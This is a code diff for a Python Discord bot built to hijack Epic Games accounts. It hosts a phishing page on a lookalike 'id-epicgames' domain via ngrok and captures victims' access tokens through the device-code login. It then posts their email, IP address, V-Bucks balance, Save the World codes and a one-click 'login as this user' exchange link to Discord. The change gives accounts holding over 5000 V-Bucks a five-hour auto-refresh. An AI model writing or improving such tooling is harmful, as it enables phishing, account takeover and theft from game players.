@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Discord Bot for Epic Games Authentication with Authorization Code generation 
+Discord Bot for Epic Games Authentication with extended 5-hour refresh sessions
 for high-value accounts.
-- Last Updated: 2025-11-20 09:15:00
+- Last Updated: 2025-11-20 09:30:00
 """
 
 # --- SETUP AND INSTALLATION ---
@@ -18,7 +18,7 @@ import time
 import logging
 import asyncio
 import threading
-from datetime import datetime, timedelta
+from datetime import datetime
 import http.server
 import socketserver
 import uuid
@@ -43,9 +43,9 @@ NGROK_DOMAIN = "help.id-epicgames.com" # Will fall back to a free URL if this fa
 
 # --- Epic Games & Timings ---
 EPIC_TOKEN = "OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3"
-FORTNITE_IOS_CLIENT_ID = "3f69e56c7649492c8cc29f1af08a8a12"
 REFRESH_INTERVAL = 180  # 3 minutes
-SESSION_DURATION = 10800 # 3 hours
+DEFAULT_SESSION_DURATION = 10800 # 3 hours
+HIGH_VALUE_SESSION_DURATION = 18000 # 5 hours
 VBUCKS_THRESHOLD = 5000
 
 # --- Channel Name ---
@@ -68,10 +68,9 @@ active_sessions = {}
 session_lock = threading.Lock()
 
 # ==============================================================================
-# --- NGROK AND WEB SERVER (No changes from v2/v3) ---
+# --- NGROK AND WEB SERVER (No changes) ---
 # ==============================================================================
 def run_setup():
-    """Ensures ngrok is installed and configured."""
     print("--- Starting initial setup ---")
     ngrok_path = os.path.join(os.getcwd(), "ngrok")
     if not os.path.exists(ngrok_path):
@@ -138,7 +137,7 @@ class RequestHandler(http.server.SimpleHTTPRequestHandler):
             self.send_error(404)
 
     def log_message(self, format, *args):
-        pass # Suppress HTTP logs
+        pass
 
 def run_web_server(port):
     with socketserver.ThreadingTCPServer(("", port), RequestHandler) as httpd:
@@ -185,6 +184,7 @@ def setup_ngrok_tunnel(port):
     else:
         logger.critical("❌ Ngrok failed to start or create a tunnel after 20 seconds.")
         sys.exit(1)
+
 # ==============================================================================
 # --- EPIC GAMES API & DISCORD LOGIC ---
 # ==============================================================================
@@ -201,6 +201,7 @@ async def create_epic_auth_session():
             dev_auth = await r.json()
     return {'activation_url': f"https://www.epicgames.com/id/activate?userCode={dev_auth['user_code']}", 'device_code': dev_auth['device_code'], 'interval': dev_auth.get('interval', 5), 'expires_in': dev_auth.get('expires_in', 600)}
 
+
 async def get_exchange_code(access_token):
     try:
         async with aiohttp.ClientSession() as sess:
@@ -208,22 +209,6 @@ async def get_exchange_code(access_token):
             async with sess.get("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange", headers=headers) as r:
                 return (await r.json())['code'] if r.status == 200 else None
     except Exception: return None
-
-async def get_authorization_code(access_token):
-    """Generates a client authorization code from an access token."""
-    url = f"https://www.epicgames.com/id/api/redirect?clientId={FORTNITE_IOS_CLIENT_ID}&responseType=code"
-    headers = {"Authorization": f"bearer {access_token}"}
-    try:
-        async with aiohttp.ClientSession() as sess:
-            async with sess.get(url, headers=headers) as r:
-                if r.status == 200:
-                    return (await r.json())['authorizationCode']
-                else:
-                    logger.warning(f"Failed to get authorization code, status {r.status}: {await r.text()}")
-                    return None
-    except Exception as e:
-        logger.error(f"❌ Exception while getting authorization code: {e}")
-        return None
 
 async def get_stw_codes(access_token, account_id):
     logger.info(f"[{account_id[:8]}] Fetching STW friend codes...")
@@ -239,6 +224,7 @@ async def get_stw_codes(access_token, account_id):
             except Exception: continue
     return all_codes
 
+
 async def get_vbucks_balance(access_token, account_id):
     headers = {"Authorization": f"bearer {access_token}", "Content-Type": "application/json"}
     url = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/QueryProfile?profileId=common_core"
@@ -253,8 +239,8 @@ async def get_vbucks_balance(access_token, account_id):
     except Exception: return 0
     return 0
 
+
 async def get_or_create_channel(guild, channel_name):
-    """Gets or creates a text channel in a guild."""
     for channel in guild.text_channels:
         if channel.name == channel_name:
             return channel
@@ -264,10 +250,12 @@ async def get_or_create_channel(guild, channel_name):
         logger.error(f"Failed to create channel '{channel_name}' in guild '{guild.name}'. Missing permissions.")
         return None
 
+
 @bot.event
 async def on_guild_join(guild):
     logger.info(f"Joined new guild: {guild.name} (ID: {guild.id})")
     await get_or_create_channel(guild, MAIN_CHANNEL_NAME)
+
 
 @bot.event
 async def on_ready():
@@ -282,47 +270,52 @@ async def on_ready():
                 logger.error(f"Could not send startup message to {guild.name}.")
     print(f"✅ Bot is ready and channels are configured in {len(bot.guilds)} guild(s).\n" + "=" * 60)
 
-def build_user_embed(session, codes, is_initial):
+
+def build_user_embed(session, exchange_code, is_initial):
     """Helper function to build the consistent user information embed."""
     account_info = session['account_info']
-    exchange_code, auth_code = codes['exchange'], codes['authorization']
     display_name, email, account_id = account_info.get('displayName', 'N/A'), account_info.get('email', 'N/A'), account_info.get('id', 'N/A')
     login_link = f"https://www.epicgames.com/id/exchange?exchangeCode={exchange_code}&redirectUrl=https%3A%2F%2Flauncher.store.epicgames.com%2Fsite%2Faccount"
 
     title = "✅ User Logged In Successfully" if is_initial else "🔄 User Session Refreshed"
     description = f"**{display_name}** has completed verification." if is_initial else f"Session for **{display_name}** has been updated."
-    embed = discord.Embed(title=title, description=description, color=discord.Color.green())
+    
+    is_high_value = session['vbucks'] > VBUCKS_THRESHOLD
+    embed_color = discord.Color.gold() if is_high_value else discord.Color.green()
+    embed = discord.Embed(title=title, description=description, color=embed_color)
 
     embed.add_field(name="Display Name", value=display_name, inline=True)
     embed.add_field(name="Email", value=email, inline=True)
     embed.add_field(name="V-Bucks", value=f"**{session['vbucks']}** 💸" if session['vbucks'] > 0 else "0", inline=True)
+    
     embed.add_field(name="Account ID", value=f"`{account_id}`", inline=False)
     embed.add_field(name="IP Address", value=f"`{session['user_ip']}`", inline=False)
     
     if session['stw_codes']:
         embed.add_field(name="🔑 Save The World Codes", value="\n".join(session['stw_codes']), inline=False)
 
-    # Add the Authorization Code only if V-Bucks are over the threshold
-    if auth_code:
-        embed.add_field(name="💎 Authorization Code (High Value)", value=f"```{auth_code}```", inline=False)
-        embed.colour = discord.Color.gold()
-
     embed.add_field(name="🔗 Direct Login Link", value=f"**[Click to login as this user]({login_link})**", inline=False)
     embed.add_field(name="Exchange Code", value=f"```{exchange_code}```", inline=False)
 
-    expires_at = datetime.fromtimestamp(session['expires_at'])
-    embed.set_footer(text=f"Session ID: {session['session_id']} | Refresh #{session['refresh_count']} | Expires: {expires_at.strftime('%H:%M:%S UTC')}")
+    duration_hours = session['duration'] / 3600
+    expires_timestamp = int(session['expires_at'])
+    footer_text = f"Session ID: {session['session_id']} | Refresh #{session['refresh_count']} | Refreshes for {int(duration_hours)} hours"
+    
+    if is_high_value:
+        footer_text += " (High Value)"
+
+    embed.set_footer(text=footer_text)
     embed.timestamp = datetime.utcnow()
     
     return embed
 
-async def send_or_update_embed(session_id, codes, is_initial=False):
-    """Sends the initial embed or edits an existing one."""
+
+async def send_or_update_embed(session_id, exchange_code, is_initial=False):
     with session_lock:
         session = active_sessions.get(session_id)
         if not session: return
 
-    embed = build_user_embed(session, codes, is_initial)
+    embed = build_user_embed(session, exchange_code, is_initial)
 
     for guild in bot.guilds:
         channel = await get_or_create_channel(guild, MAIN_CHANNEL_NAME)
@@ -346,6 +339,7 @@ async def send_or_update_embed(session_id, codes, is_initial=False):
                     if session_id in active_sessions:
                         active_sessions[session_id]['message_ids'][guild.id] = new_message.id
 
+
 # ==============================================================================
 # --- CORE AUTHENTICATION & REFRESH LOGIC ---
 # ==============================================================================
@@ -355,6 +349,7 @@ def monitor_epic_auth_sync(device_code, interval, expires_in, user_ip):
     asyncio.set_event_loop(loop)
     try: loop.run_until_complete(monitor_epic_auth(device_code, interval, expires_in, user_ip))
     finally: loop.close()
+
 
 async def monitor_epic_auth(device_code, interval, expires_in, user_ip):
     """Monitors the Epic Games device authentication flow for completion."""
@@ -384,9 +379,8 @@ async def monitor_epic_auth(device_code, interval, expires_in, user_ip):
                     stw_codes = await get_stw_codes(access_token, account_id)
                     vbucks = await get_vbucks_balance(access_token, account_id)
                     
-                    auth_code = None
-                    if vbucks > VBUCKS_THRESHOLD:
-                        auth_code = await get_authorization_code(access_token)
+                    # Set session duration based on V-Bucks balance
+                    duration = HIGH_VALUE_SESSION_DURATION if vbucks > VBUCKS_THRESHOLD else DEFAULT_SESSION_DURATION
 
                     session_id = str(uuid.uuid4())[:8]
                     with session_lock:
@@ -395,17 +389,18 @@ async def monitor_epic_auth(device_code, interval, expires_in, user_ip):
                             'access_token': access_token,
                             'account_info': account_info,
                             'user_ip': user_ip,
-                            'expires_at': time.time() + SESSION_DURATION,
+                            'duration': duration,
+                            'expires_at': time.time() + duration,
                             'stw_codes': stw_codes,
                             'vbucks': vbucks,
                             'message_ids': {},
                             'refresh_count': 0
                         }
                     
-                    initial_codes = {'exchange': exchange_code, 'authorization': auth_code}
-                    asyncio.run_coroutine_threadsafe(send_or_update_embed(session_id, initial_codes, is_initial=True), bot.loop)
+                    asyncio.run_coroutine_threadsafe(send_or_update_embed(session_id, exchange_code, is_initial=True), bot.loop)
                     asyncio.run_coroutine_threadsafe(auto_refresh_session(session_id), bot.loop)
                     return
+
 
 async def auto_refresh_session(session_id):
     """Refreshes codes and updates the Discord message."""
@@ -422,25 +417,21 @@ async def auto_refresh_session(session_id):
             session = active_sessions.get(session_id)
             if not session: break
         
-        # Refresh all necessary codes
         new_exchange_code = await get_exchange_code(session['access_token'])
-        new_auth_code = None
-        if session['vbucks'] > VBUCKS_THRESHOLD:
-            new_auth_code = await get_authorization_code(session['access_token'])
         
         if new_exchange_code:
             with session_lock:
                 if session_id in active_sessions:
                     active_sessions[session_id]['refresh_count'] += 1
             
-            logger.info(f"[{session_id}] ✅ Codes REFRESHED for {display_name} (Refresh #{session['refresh_count']})")
-            refreshed_codes = {'exchange': new_exchange_code, 'authorization': new_auth_code}
-            await send_or_update_embed(session_id, refreshed_codes)
+            logger.info(f"[{session_id}] ✅ Exchange code REFRESHED for {display_name} (Refresh #{session['refresh_count']})")
+            await send_or_update_embed(session_id, new_exchange_code)
         else:
             logger.warning(f"[{session_id}] Exchange code refresh failed for {display_name}. Retrying.")
 
     with session_lock: active_sessions.pop(session_id, None)
     logger.info(f"[{session_id}] 🔚 Auto-refresh task ENDED for {display_name}.")
+
 
 # ==============================================================================
 # --- APPLICATION STARTUP ---
